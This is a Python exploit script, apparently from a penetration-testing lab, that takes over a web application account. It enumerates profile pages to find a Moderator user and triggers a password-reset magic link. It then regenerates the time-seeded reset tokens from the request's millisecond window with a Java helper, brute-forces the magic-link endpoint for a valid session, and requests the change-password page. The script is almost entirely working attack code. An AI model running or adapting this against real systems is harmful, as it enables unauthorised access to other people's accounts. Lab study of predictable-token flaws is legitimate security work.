import sys, re, os
import requests
import subprocess
import base64
import json
import time
requests.packages.urllib3.disable_warnings()

proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

def b64encode(s):
	return base64.b64encode(s.encode()).decode()

def current_milli_time():
	return int(time.time() * 1000)

def getUserInfo(ip):
	# Search through profiles
	for i in range(20):
		target = f"http://{ip}/profile/{i}"
		r = requests.get(target)
		u = re.findall(r'<div class=\"title\">\s*<h2>\s*(.*)\s*<\/h2>\s*<\/div>', r.text)
		if len(u) != 1: continue
		username = u[0]

		if "Moderator" in r.text and "Administrator" not in r.text:
			print("User account found!")
			return i, username

def requestResetPassword(ip, username):
	target = f"http://{ip}/generateMagicLink"
	data = {
		'username': username
	}

	r = requests.post(target, data=data)

# Uses java to generate list of tokens
def gen_tokens(low, high, userId):
	cmd = f"java create_token.java {low} {high} {userId}"
	proc = subprocess.run(cmd, shell=True, capture_output=True)
	output = proc.stdout.decode()
	tokens = output.split('\n')

	tokens = [token for token in tokens if token != '']
	return tokens

def login(ip, tokens):
	for token in tokens:
		target = f"http://{ip}/magicLink/{token}"

		s = requests.session()
		A = time.time()
		r = s.get(target, allow_redirects=False)
		B = time.time() 

		if len(s.cookies):
			print("Valid token found!")
			return s
		

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	# username = "admin-Standard"
	# password = "PwnedPassword!"
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001

	print("[+] Searching for username")
	userId, username = getUserInfo(ip)
	print(f"[+] Username found! {userId},{username}")

	low = current_milli_time() - 10
	requestResetPassword(ip, username)
	high = current_milli_time() 
	print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")

	tokens = gen_tokens(low, high, userId)
	print("[+] Performing login brute-force")
	s = login(ip, tokens)

	s.get(f"http://{ip}/user/changePassword",proxies=proxies)

if __name__ == '__main__':
	main()